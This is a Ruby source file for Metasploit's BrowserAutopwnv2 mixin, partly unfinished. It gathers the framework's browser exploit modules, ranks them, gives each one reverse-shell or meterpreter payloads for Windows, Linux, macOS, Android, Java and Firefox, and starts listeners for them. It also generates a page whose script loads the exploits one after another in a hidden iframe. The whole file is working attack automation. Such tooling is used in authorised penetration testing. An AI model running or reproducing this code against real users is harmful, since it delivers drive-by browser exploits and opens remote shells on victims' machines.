###
#
# The Msf::Exploit::Remote::BrowserAutopwnv2 mixin is a replacement for the current BrowserAutoPwn
#
###

require 'Date'

module Msf
  module Exploit::Remote::BrowserAutopwnv2

    # Exception specific for Msf::Exploit::Remote::BrowserAutopwnv2
    class BAPv2Exception < RuntimeError; end

    include Msf::Exploit::Remote::BrowserExploitServer

    # @return [Array] A list of initialized BAP exploits
    attr_reader :bap_exploits


    # The default platform-specific payloads and preferred LPORTS.
    # The hash key is the name of the platform that matches what's on the module.
    # The loader order is specific.
    DEFAULT_PAYLOADS = {
      'firefox' => { 'payload' => 'firefox/shell_reverse_tcp',         'lport' => 4449 },
      'android' => { 'payload' => 'android/meterpreter/reverse_tcp',   'lport' => 4448 },
      'win'     => { 'payload' => 'windows/meterpreter/reverse_tcp',   'lport' => 4444 },
      'linux'   => { 'payload' => 'linux/x86/meterpreter/reverse_tcp', 'lport' => 4445 },
      'osx'     => { 'payload' => 'osx/x86/shell_reverse_tcp',         'lport' => 4446 },
      'java'    => { 'payload' => 'java/meterpreter/reverse_tcp',      'lport' => 4447 },
      'generic' => { 'payload' => 'generic/shell_reverse_tcp',         'lport' => 4450 }
    }


    # Returns all the found exploit modules that support BrowserExploitServer by going through all
    # the exploits from the framework object.
    #
    # @return [void]
    def init_exploits
      # First we're going to avoid using #find_all because that gets very slow.
      framework.exploits.each_pair do |fullname, plader_holder|
        next if !fullname.include?('browser') || self.fullname == "exploit/#{fullname}"

        # Regex search
        next if datastore['Include'] && fullname !~ datastore['Include']

        mod = framework.exploits.create(fullname)
        unless mod
          print_status("Failed to load: #{fullname}")
          next
        end
        if mod.kind_of?(Msf::Exploit::Remote::BrowserExploitServer)
          set_exploit_options(mod)
          @bap_exploits << mod
        end
      end
    end

    def note_type_prefix
      @note_type_prefix ||= "BAP.#{Time.now.to_i}.Client"
    end

    def rm_target_info_notes
      return unless framework.db.active
      ::ActiveRecord::Base.connection_pool.with_connection {
        framework.db.notes.each do |note|
          if note.ntype.include?(note_type_prefix)
            note.destroy
          end
        end
      }
    end

    def cleanup
      rm_target_info_notes
    end


    # Modifies an exploit's default datastore options.
    #
    # @return [void]
    def set_exploit_options(xploit)
      # We could do a massive xploit.datastore.merge!(self.datastore), but this seems
      # really expensive. Costs more loading time.

      # Set options configurable by the user.
      p = select_payload(xploit)
      xploit.datastore['PAYLOAD']     = p['payload']
      xploit.datastore['LPORT']       = p['lport']
      xploit.datastore['SRVHOST']     = datastore['SRVHOST']
      xploit.datastore['JsObfuscate'] = datastore['JsObfuscate'] if datastore['JsObfuscate']
      xploit.datastore['CookieName']  = datastore['CookieName'] if datastore['CookieName']
      xploit.datastore['VERBOSE']     = datastore['VERBOSE'] if datastore['VERBOSE']
      xploit.datastore['Retries']     = datastore['Retries'] if datastore['Retries']
      xploit.datastore['SSL']         = datastore['SSL'] if datastore['SSL']
      xploit.datastore['SSLVersion']  = datastore['SSLVersion'] if datastore['SSLVersion']
      xploit.datastore['LHOST']       = get_payload_lhost

      # Set options only configurable by BAP.
      xploit.datastore['DisablePayloadHandler'] = true
      xploit.datastore['NoteTypePrefix']        = note_type_prefix
      xploit.datastore['URIPATH']               = "/#{assign_module_resource}"
      xploit.datastore['MODULEOWNER']           = Msf::Exploit::Remote::BrowserAutopwnv2
    end


    # Checks if a resource is already taken or not.
    #
    # @return [TrueClass] Resource is taken.
    # @return [FalseClass] Resource is not taken.
    def is_resource_taken?(resource)
      taken = false

      bap_exploits.each do |m|
        return true if m.datastore['URI'] == resource
      end

      taken
    end


    # Returns a unique resource path.
    #
    # @return [String] A unique resource path.
    def assign_module_resource
      resource = ''
      while
        resource = Rex::Text.rand_text_alpha(rand(10) + 4)
        break unless is_resource_taken?(resource)
      end

      resource
    end


    # Modifies @bap_exploits by sorting. The newest and with the highest ranking goes on top.
    #
    # @see #bap_exploits The read-only attribute.
    # @see #sort_date_in_group The method for sorting by disclosure date
    # @see #sort_group_by_rank The method for sorting by rank
    # @see #sort_bap_modules The method for breaking the module list into groups
    # @see #finalize_sorted_modules The method for finalizing bap_exploits
    # @return [void]
    def sort_bap_exploits
      bap_groups = group_bap_modules
      bap_groups = sort_date_in_group(bap_groups)
      bap_groups = sort_group_by_rank(bap_groups)
      finalize_sorted_modules(bap_groups)
    end


    # Sorts a grouped module list by disclosure date.
    #
    # @param [Hash] A grouped module list.
    # @return [Hash] A hash with each module list sorted by disclosure date.
    def sort_date_in_group(bap_groups)
      bap_groups.each_pair do |ranking, module_list|
        bap_groups[ranking] = module_list.sort_by {|m| Date.parse(m.disclosure_date.to_s)}.reverse
      end
    end


    # Sorts a module list by ranking.
    #
    # @param [Hash] A grouped module list.
    # @return [Hash] A hash grouped by ranking.
    def sort_group_by_rank(bap_groups)
      Hash[bap_groups.sort_by {|k,v| k}.reverse]
    end


    # Breaks @bap_exploits into groups for sorting purposes.
    #
    # @return [Hash] A module list grouped by rank.
    def group_bap_modules
      bap_groups = {}
      RankingName.each_pair do |ranking, value|
        bap_groups[ranking] = []
        bap_exploits.each do |m|
          next if m.rank != ranking
          bap_groups[ranking] << m
        end
      end
      bap_groups
    end


    # Modifies @bap_exploit by replacing it with the rearranged module list.
    #
    # @see #bap_exploits The read-only attribute.
    # @param [Hash] A grouped module list.
    # @return [void]
    def finalize_sorted_modules(bap_groups, max=20)
      @bap_exploits = []
      bap_groups.each_pair do |ranking, module_list|
        module_list.each do |m|
          break if @bap_exploits.length >= max
          @bap_exploits << m
        end
      end
    end


    def is_payload_handler_wanted?(payload_name)
      bap_exploits.each do |m|
        return true if m.datastore['PAYLOAD'] == payload_name
      end

      false
    end


    def get_selected_payload_name(platform)
      payload_name = datastore["PAYLOAD_#{platform.upcase}"]

      # The payload is legit, we can use it.
      # Avoid #create seems faster
      return payload_name if framework.payloads.keys.include?(payload_name)

      default = DEFAULT_PAYLOADS[platform]['payload']
      print_status("Unknown payload set: #{payload_name}. Falling back to: #{default}.")

      # The user has configured some unknown payload that we can't use,
      # fall back to default.
      default
    end

    def get_selected_payload_lport(platform)
      datastore["PAYLOAD_#{platform.upcase}_LPORT"]
    end


    def get_payload_lhost
      datastore['LHOST'] || Rex::Socket.source_address
    end


    # Creates payload listeners.
    #
    # @note INCOMPLETE
    # @return [void]
    def start_payload_listeners
      DEFAULT_PAYLOADS.each_pair do |platform, listener_info|
        # Exploit failed: firefox/shell_reverse_tcp is not a compatible payload
        next if listener_info['payload'] == 'firefox/shell_reverse_tcp'

        # Don't waste resources. This shaves about a second in loading speed.
        next unless is_payload_handler_wanted?(listener_info['payload'])

        multi_handler = framework.modules.create('exploit/multi/handler')
        # User configurable options
        # We could do a massive multi_handler.datastore.merge!(self.datastore), but this seems
        # really expensive. Costs more loading time.
        multi_handler.datastore['LHOST']                = get_payload_lhost
        multi_handler.datastore['PAYLOAD']              = get_selected_payload_name(platform)
        multi_handler.datastore['LPORT']                = get_selected_payload_lport(platform)
        multi_handler.datastore['DebugOptions']         = datastore['DebugOptions'] if datastore['DebugOptions']
        multi_handler.datastore['AutoLoadAndroid']      = datastore['AutoLoadAndroid'] if datastore['AutoLoadAndroid']
        multi_handler.datastore['PrependMigrate']       = datastore['PrependMigrate'] if datastore['PrependMigrate']
        multi_handler.datastore['PrependMigrateProc']   = datastore['PrependMigrateProc'] if datastore['PrependMigrateProc']
        multi_handler.datastore['InitialAutoRunScript'] = datastore['InitialAutoRunScript'] if datastore['InitialAutoRunScript']
        multi_handler.datastore['AutoRunScript']        = datastore['AutoRunScript'] if datastore['AutoRunScript']

        # Configurable only by BAP
        multi_handler.datastore['EXITONSESSION'] = false
        multi_handler.datastore['EXITFUNC']      = 'thread'
        multi_handler.datastore['MODULEOWNER']   = Msf::Exploit::Remote::BrowserAutopwnv2

        # Now we're ready to start the handler
        multi_handler.exploit_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'Payload' => listener_info['payload'],
          'RunAsJob' => true
        )
      end
    end


    # Returns a list of suitable exploits for the current target.
    #
    # @param [Hash] Target's information such as the OS, browser, 3rd-party plugins, etc.
    # @return [Array] A list of suitable exploits to use against the target.
    def find_suitable_exploits(target_info)
      $stderr.puts target_info.inspect
    end


    def parse_rank(rank)
      rank_str = ''

      case rank
      when 0
        rank_str = 'Manual'
      when 100
        rank_str = 'Low'
      when 200
        rank_str = 'Average'
      when 300
        rank_str = 'Normal'
      when 400
        rank_str = 'Good'
      when 500
        rank_str = 'Great'
      when 600
        rank_str = 'Excellent'
      end

      rank_str
    end


    def select_payload(m)
      selected_payload = DEFAULT_PAYLOADS['generic']
      DEFAULT_PAYLOADS.each_pair do |p, info|
        preferred = info['payload']
        m.compatible_payloads.each do |k|
          return info if k[0] == preferred
        end
      end

      selected_payload
    end


    def start_exploits
      bap_exploits.each do |m|
        m.exploit_simple(
          'LocalInput'  => self.user_input,
          'LocalOutput' => self.user_output,
          'Target'      => 0,
          'Payload'     => m.datastore['PAYLOAD'],
          'RunAsJob'    => true
        )
      end
    end


    # Sets up BAPv2. This is like our main function.
    #
    # @see #init_exploits
    # @see #sort_bap_exploits
    # @return [void]
    def setup
      t1 = Time.now
      self.datastore['MODULEOWNER'] = Msf::Exploit::Remote::BrowserAutopwnv2
      self.datastore['DisablePayloadHandler'] = true
      super
      @bap_exploits = []

      print_status("Searching BES exploits, please wait...")
      init_exploits
      sort_bap_exploits

      print_status("Starting exploit modules...")
      start_exploits

      print_status("Starting listeners...")
      start_payload_listeners

      t2 = Time.now
      print_line
      print_status("Time spent: #{(t2-t1).inspect}")
    end


    def show_ready_exploits
      columns = ['Order', 'Rank', 'Name', 'Path', 'Payload']

      # If not verbose, you're not in dev mode.
      # As an user, you shouldn't be using any of these paths anyway.
      columns.delete('Path') if !datastore['VERBOSE']

      table = Rex::Ui::Text::Table.new(
        'Header'  => 'Exploits',
        'Indent'  => 1,
        'Columns' => columns
      )

      # Without the order, sometimes the Rex table messes up even though in the array
      # the order looks right. So don't get rid of this.
      order = 1

      bap_exploits.each do |m|
        row = []
        row << order
        row << parse_rank(m.rank)
        row << m.shortname
        row << m.datastore['URIPATH'] if datastore['VERBOSE']
        row << "#{m.datastore['PAYLOAD']} on #{m.datastore['LPORT']}"
        table << row
        order += 1
      end

      print_line
      print_status("The following is a list of exploits that BrowserAutoPwn will consider using.")
      print_status("Exploits with the highest ranking and newest will be tried first.")
      print_line
      print_line table.to_s
    end

    def start_service
      super
      show_ready_exploits
      print_status("Please use the following URL for the browser attack:")
      print_status("BrowserAutoPwn URL: #{self.get_uri}")
    end

    def show_payloads
      DEFAULT_PAYLOADS.keys.each do |platform|
        payload_name = get_selected_payload_name(platform)
        p = framework.payloads.create(payload_name)
        p.datastore['LHOST'] = get_payload_lhost
        p.datastore['LPORT'] = get_selected_payload_lport(platform)
        next unless p
        p_opt = Serializer::ReadableText.dump_options(p, '   ')
        print("\nPayload options (#{payload_name}):\n\n#{p_opt}\n") if (p_opt and p_opt.length > 0)
      end
    end

    def set_payload
      print_status("'set payload' has been disabled for BrowserAutoPwn.")
      print_status('You should set a platform-specific payload instead via advanced options:')
      print_line
      table = Rex::Ui::Text::Table.new(
        'Header'  => 'Advanced Options',
        'Indent'  => 1,
        'Columns' => ['Option Name', 'Description']
      )
      DEFAULT_PAYLOADS.each_pair do |platform, payload_info|
        table << ["PAYLOAD_#{platform.upcase}", "Payload for #{platform} browser exploits"]
      end
      print_line(table.to_s)
      print_status("Example: set PAYLOAD_WIN windows/meterpreter/reverse_tcp")
      print_line
      print_status("For a list of payloads, you can do: show payloads")
      print_status("You can also see 'show advanced' for more options.")
    end

    def get_exploit_urls
      urls = []

      bap_exploits.each do |mod|
        proto = datastore['SSL'] ? 'https' : 'http'
        host = datastore['URIHOST'] || Rex::Socket.source_address
        port = datastore['SRVPORT']
        resource = mod.datastore['URIPATH']
        url = "#{proto}://#{host}:#{port}#{resource}"
        urls << url
      end

      urls
    end

    # On the fly
    def build_html
      js = %Q|
      var currentIndex = 0;
      var exploitList = [#{get_exploit_urls.map! {|e| "'#{e}'"} * ", "}];

      window.onload = function() {
        var e = document.createElement("iframe");
        e.setAttribute("id", "myiframe");
        if (typeof e.style.setAttribute == 'undefined') {
          e.setAttribute("style", "visibility:hidden;height:0;width:0;border:0");
        } else {
          e.style.setAttribute("visibility", "hidden");
          e.style.setAttribute("height", "0");
          e.style.setAttribute("width", "0");
          e.style.setAttribute("border", "0");
        }
        document.body.appendChild(e);
        setTimeout("loadExploit(currentIndex)", 1000);
      }

      function loadExploit(i) {
        var e = document.getElementById("myiframe");
        e.setAttribute("src", exploitList[i]);
        currentIndex += 1;
      }
      |

      %Q|<html>
      <head>
      <script>
      #{js}
      </script>
      </head>
      <body>
      </body>
      </html>
      #{datastore['Content']}|
    end

  end
end
